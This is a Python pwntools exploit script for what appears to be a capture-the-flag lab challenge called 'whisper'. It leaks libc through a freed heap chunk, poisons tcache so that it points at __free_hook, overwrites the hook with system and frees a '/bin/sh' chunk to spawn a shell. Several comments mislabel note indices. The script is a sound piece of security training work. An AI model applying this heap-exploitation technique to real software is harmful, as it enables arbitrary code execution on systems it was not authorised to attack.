#!/usr/bin/env python3
from pwn import *

HOST = "offsec.m0lecon.it"
PORT = 13578

context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab10/challenges/04_whisper/whisper', checksec=False)
libc = ELF('/home/kali/Desktop/offsec/labs/lab10/challenges/04_whisper/libc.so.6', checksec=False)

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

p = conn()

malloc_hook_offset = 0x00000000001ecb70 # with readelf -sW ./libc.so.6 | grep malloc_hook
main_arena_bins_0_offset = malloc_hook_offset + 0x70 #&main arena.bins[0] = libc base + ( malloc hook offset) + 0x70
# libc_base = leak - main_arena_bins_0_offset

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'0') #allocate note 0
p.sendlineafter(b'size: ', str(0x800).encode())  #so it goes into unsorted bins
p.sendlineafter(b'data: ', b'dummy')

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'1') #allocate note 1, guard note to avoid coalescing of note 0 when freed
p.sendlineafter(b'size: ', str(0x800).encode()) 
p.sendlineafter(b'data: ', b'dummy')

p.sendlineafter(b'> ', b'2')    # free note 
p.sendlineafter(b'index: ', b'0') #free note 0

p.sendlineafter(b'> ', b'4')    # show note 
p.sendlineafter(b'index: ', b'0') #show freed note 0
leak = u64(p.recv(8).ljust(8, b'\x00')) #at offset 0 of the free chunk for note 0 there is the encoded_fd

libc_base = leak - main_arena_bins_0_offset
libc.address = libc_base
free_hook = libc.sym['__free_hook']
system = libc.sym['system']

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'2') #allocate note 2
p.sendlineafter(b'size: ', str(0x60).encode()) 
p.sendlineafter(b'data: ', b'dummy')

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'3') #allocate note 3
p.sendlineafter(b'size: ', str(0x60).encode()) 
p.sendlineafter(b'data: ', b'dummy')

p.sendlineafter(b'> ', b'2')    # free note 
p.sendlineafter(b'index: ', b'3') #free note 

p.sendlineafter(b'> ', b'2')    # free note 
p.sendlineafter(b'index: ', b'2') #free note 0

# so now these 2 small chunks are in tcache when freed
# head -> note2 -> note3

p.sendlineafter(b'> ', b'3')    # send data to edit note 2 fd to __free_hook
p.sendlineafter(b'index: ', b'2')
p.sendlineafter(b'data: ', p64(free_hook))     #fd is in the first 8 bytes of the free'd chunk

#FREE CHUNKS: note 2 (fd-> free_hook); note 3 (fd -> NULL)

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'2') #allocate note 2
p.sendlineafter(b'size: ', str(0x60).encode()) 
p.sendlineafter(b'data: ', b'dummy') #consumes note 0

#now because fd is set to free_hook, next allocation will point to it

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'3') #allocate note 3
p.sendlineafter(b'size: ', str(0x60).encode()) 
p.sendlineafter(b'data: ', p64(system)) 

p.sendlineafter(b'> ', b'1')    # allocate note 
p.sendlineafter(b'index: ', b'4') #allocate note 4
p.sendlineafter(b'size: ', str(0x20).encode()) 
p.sendlineafter(b'data: ', b'/bin/sh\x00') #consumes note 0

p.sendlineafter(b'> ', b'2')    # free note 
p.sendlineafter(b'index: ', b'4') #free note 2: will call system("bin/sh")

p.interactive()